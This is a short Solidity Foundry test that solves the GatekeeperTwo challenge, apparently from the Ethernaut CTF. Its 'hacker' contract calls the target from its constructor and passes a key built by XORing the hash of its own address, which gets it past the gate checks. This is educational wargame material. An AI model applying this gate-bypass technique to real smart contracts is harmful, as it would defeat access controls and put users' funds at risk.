// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "../lib/forge-std/src/Test.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo target;
    GatekeeperTwoHacker targetHacker;

    function setUp() public {
        target = new GatekeeperTwo();
    }

    function test_GatekeeperTwo() public {
        targetHacker = new GatekeeperTwoHacker(address(target));
    }
}

contract GatekeeperTwoHacker {
    constructor(address target) {
        uint64 xorKey = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ type(uint64).max;
        bytes8 key = bytes8(xorKey);

        (bool success, ) = address(target).call(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
    }
}
